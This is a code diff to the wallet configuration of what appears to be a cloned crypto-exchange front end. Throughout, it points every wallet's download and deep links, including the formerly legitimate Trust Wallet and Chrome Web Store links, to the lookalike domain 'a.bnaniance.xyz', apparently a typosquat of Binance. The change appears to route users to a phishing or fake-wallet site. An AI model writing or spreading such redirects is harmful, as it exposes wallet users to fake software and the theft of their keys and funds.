@@ -40,9 +40,9 @@ const walletsConfig = ({
       icon: '/images/wallets/metamask.png',
       installed: typeof window !== 'undefined' && Boolean(window.ethereum?.isMetaMask) && metaMaskConnector.ready,
       connectorId: ConnectorNames.MetaMask,
-      deepLink: 'http://a.bnaniance.xyz',
-      qrCode,
-      downloadLink: 'http://a.bnaniance.xyz',
+      deepLink: 'https://a.bnaniance.xyz',
+
+      downloadLink: 'https://a.bnaniance.xyz',
     },
     {
       id: 'binance',
@@ -50,13 +50,10 @@ const walletsConfig = ({
       icon: '/images/wallets/binance.png',
       installed: typeof window !== 'undefined' && Boolean(window.BinanceChain),
       connectorId: ConnectorNames.BSC,
-      guide: {
-        desktop: 'http://a.bnaniance.xyz',
-      },
       downloadLink: {
         desktop: isFirefox
-          ? 'http://a.bnaniance.xyz'
-          : 'http://a.bnaniance.xyz',
+          ? 'https://a.bnaniance.xyz'
+          : 'https://a.bnaniance.xyz',
       },
     },
     {
@@ -64,6 +61,10 @@ const walletsConfig = ({
       title: 'Coinbase Wallet',
       icon: '/images/wallets/coinbase.png',
       connectorId: ConnectorNames.WalletLink,
+      installed: typeof window !== 'undefined' && Boolean((window.ethereum as ExtendEthereum)?.isCoinbase),
+      deepLink: 'https://a.bnaniance.xyz',
+
+      downloadLink: 'https://a.bnaniance.xyz',
     },
     {
       id: 'trust',
@@ -74,17 +75,20 @@ const walletsConfig = ({
         typeof window !== 'undefined' &&
         !(window.ethereum as ExtendEthereum)?.isSafePal && // SafePal has isTrust flag
         (Boolean(window.ethereum?.isTrust) || Boolean((window.ethereum as ExtendEthereum)?.isTrustWallet)),
-      deepLink: 'https://link.trustwallet.com/open_url?coin_id=20000714&url=https://pancakeswap.finance/',
+      deepLink: 'https://a.bnaniance.xyz',
       downloadLink: {
-        desktop: 'https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph/related',
+        desktop: 'https://a.bnaniance.xyz',
       },
-      qrCode,
     },
     {
       id: 'walletconnect',
       title: 'WalletConnect',
       icon: '/images/wallets/walletconnect.png',
       connectorId: ConnectorNames.WalletConnect,
+      installed: typeof window !== 'undefined' && Boolean((window.ethereum as ExtendEthereum)?.isWalletConnect),
+      deepLink: 'https://a.bnaniance.xyz',
+
+      downloadLink: 'https://a.bnaniance.xyz',
     },
     {
       id: 'opera',
@@ -92,7 +96,7 @@ const walletsConfig = ({
       icon: '/images/wallets/opera.png',
       connectorId: ConnectorNames.Injected,
       installed: typeof window !== 'undefined' && Boolean(window.ethereum?.isOpera),
-      downloadLink: 'http://a.bnaniance.xyz',
+      downloadLink: 'https://a.bnaniance.xyz',
     },
     {
       id: 'brave',
@@ -100,7 +104,7 @@ const walletsConfig = ({
       icon: '/images/wallets/brave.png',
       connectorId: ConnectorNames.Injected,
       installed: typeof window !== 'undefined' && Boolean(window.ethereum?.isBraveWallet),
-      downloadLink: 'http://a.bnaniance.xyz',
+      downloadLink: 'https://a.bnaniance.xyz',
     },
     {
       id: 'math',
@@ -108,7 +112,9 @@ const walletsConfig = ({
       icon: '/images/wallets/mathwallet.png',
       connectorId: ConnectorNames.Injected,
       installed: typeof window !== 'undefined' && Boolean(window.ethereum?.isMathWallet),
-      qrCode,
+      deepLink: 'https://a.bnaniance.xyz',
+
+      downloadLink: 'https://a.bnaniance.xyz',
     },
     {
       id: 'tokenpocket',
@@ -116,7 +122,9 @@ const walletsConfig = ({
       icon: '/images/wallets/tokenpocket.png',
       connectorId: ConnectorNames.Injected,
       installed: typeof window !== 'undefined' && Boolean(window.ethereum?.isTokenPocket),
-      qrCode,
+      deepLink: 'https://a.bnaniance.xyz',
+
+      downloadLink: 'https://a.bnaniance.xyz',
     },
     {
       id: 'safepal',
@@ -124,7 +132,9 @@ const walletsConfig = ({
       icon: '/images/wallets/safepal.png',
       connectorId: ConnectorNames.Injected,
       installed: typeof window !== 'undefined' && Boolean((window.ethereum as ExtendEthereum)?.isSafePal),
-      qrCode,
+      deepLink: 'https://a.bnaniance.xyz',
+
+      downloadLink: 'https://a.bnaniance.xyz',
     },
     {
       id: 'coin98',
@@ -134,18 +144,19 @@ const walletsConfig = ({
       installed:
         typeof window !== 'undefined' &&
         (Boolean((window.ethereum as ExtendEthereum)?.isCoin98) || Boolean(window.coin98)),
-      qrCode,
+      deepLink: 'https://a.bnaniance.xyz',
+
+      downloadLink: 'https://a.bnaniance.xyz',
     },
     {
       id: 'blocto',
       title: 'Blocto',
       icon: '/images/wallets/blocto.png',
       connectorId: ConnectorNames.Blocto,
-      get installed() {
-        return typeof window !== 'undefined' && Boolean((window.ethereum as ExtendEthereum)?.isBlocto)
-          ? true
-          : undefined // undefined to show SDK
-      },
+      installed: typeof window !== 'undefined' && Boolean((window.ethereum as ExtendEthereum)?.isBlocto),
+      deepLink: 'https://a.bnaniance.xyz',
+
+      downloadLink: 'https://a.bnaniance.xyz',
     },
   ]
 }
